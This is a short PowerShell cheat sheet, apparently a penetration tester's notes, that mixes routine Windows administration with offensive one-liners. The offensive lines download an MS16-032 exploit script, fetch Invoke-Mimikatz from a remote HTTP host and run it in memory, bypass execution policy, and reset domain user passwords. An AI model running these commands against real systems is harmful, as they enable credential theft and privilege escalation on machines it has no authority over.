Powershell Commands

Run Powershell Commands from Command Prompt

~~~PowerShell
powershell -c “<Command to run>”
~~~

Run Powershell File (.ps1) from Command Line

~~~PowerShell
powershell -ExecutionPolicy bypass -f "powershell_file.ps1" -parameter data
~~~

Download File/Executable from HTTP Server

~~~PowerShell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.7.30/Windows/ms16-032.ps1','MS16-032.ps1')"
~~~

Download File/Executable from HTTP Server and Execute in Memory with Arguments

~~~PowerShell
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.19.55/Windows/Powershell/Nishang/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz
~~~

Run Executable As Its Own Process

~~~PowerShell
Start-Process "shell-name.exe"
~~~

Determining Available Tokens for Impersonation

~~~PowerShell
whoami /priv
~~~

Stopping and Starting Services

~~~PowerShell
sc stop <servicename>
sc start <servicename>
~~~

Querying Service Configurations

~~~PowerShell
sc qc <servicename>
~~~

Querying Service States

~~~PowerShell
sc query <servicename>
~~~

Setting Password as Convert to Secure String for use with Setting a DomainUserPassword

~~~PowerShell
$UserPassword=ConvertTo-SecureString ‘P@ssw0rd1234’ -AsPlainText -Force
Set-DomainUserPassword -Identify <DomainUserAccount> -AccountPassword $UserPassword
~~~

Parameters within scripts

~~~PowerShell
<#
Sets parameters for scripting that can be used in the command line
.ex
script.ps1 -Variable1 V1Data -Variable2 V2Data -Variable3 V3Data
#>
param ($Variable1, $Variable2, $Variable3)
~~~

Setting Password for Local Users

~~~PowerShell
$Password = ConvertTo-SecureString $Pass -AsPlainText -Force
$UserAccount = Get-LocalUser -Name "user"
$UserAccount | Set-LocalUser -Password $Password
~~~

Renaming Computer

~~~PowerShell
Rename-Computer -NewName $CompName
~~~

Setting Bitlocker Key and then Creating a file with the recovery key information

~~~PowerShell
#Set Bitlocker key
Enable-BitLocker -MountPoint "C:" -RecoveryPasswordProtector -EncryptionMethod XtsAes256 -UsedSpaceOnly -SkipHardwareTest
#Create text file with Recovery Key Information
$BVol = Get-BitLockerVolume -MountPoint "C"
$Bvol.KeyProtector > C:\Users\user\Documents\recovery.txt
~~~

